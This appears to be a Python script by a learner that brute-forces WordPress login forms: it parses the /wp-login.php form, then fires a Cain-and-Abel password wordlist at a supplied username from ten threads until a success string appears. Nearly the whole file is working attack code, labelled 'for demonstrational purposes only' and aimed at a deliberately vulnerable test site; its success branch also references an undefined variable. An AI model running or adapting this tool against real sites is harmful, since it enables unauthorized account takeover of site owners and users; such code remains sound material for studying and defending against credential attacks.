"""
* FOR DEMOSTRATIONAL PURPOSES ONLY *
A Simple brute-forcing html form authentication on wordpress websites.
- uses cain-and-abel wordlist and brute forces supplied username and provided passwords onto the wordpress /wp-login.php
- wordlist-> https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/cain-and-abel.txt

- AERivas
"""


from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = "Welcome to WordPress!"
TARGET = "http://testphp.vulnweb.com"
WORDLIST = '/home/foxhound/BH_Python (current)/cain-and-abel.txt'

def get_words():
    """
    Returns the words found within the supplied WORDLIST
    """
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    """
    Returns a dictionary of parameters from the given HTML response content
    parses HTML content then loops through all input elements before returning
    
    Parameter content: Binary HTML content 
    """
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack Beginning on {url}.\n')
        print(f'Finished the setup where username = {username}\n')
    
    def run_bruteforce(self, passwords):
        """ Use of threading to run 10 instances of the web_bruter function in a loop """
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        """ 
        Initializes a session using the requests module. makes requests to 
        retrieves the wordpress login form as raw HTML content 
        the raw content is passed to the get_params function which parses the content
        it loops through with the provided username and the supplied WORDLIST

        Parameter passwords: queued strings for the supplied WORDLIST 
        """
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username
        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True   
                print(f"\nBruteForcing Successful.")
                print(f"Username is {self.username}")
                print(f"Password is {brute}\n")
                print('Done. Now cleaning up other threads. . .')

if __name__ == '__main__':
    words = get_words()
    # Pass in User and Url
    b = Bruter('user_name_here', TARGET)
    b.run_bruteforce(words)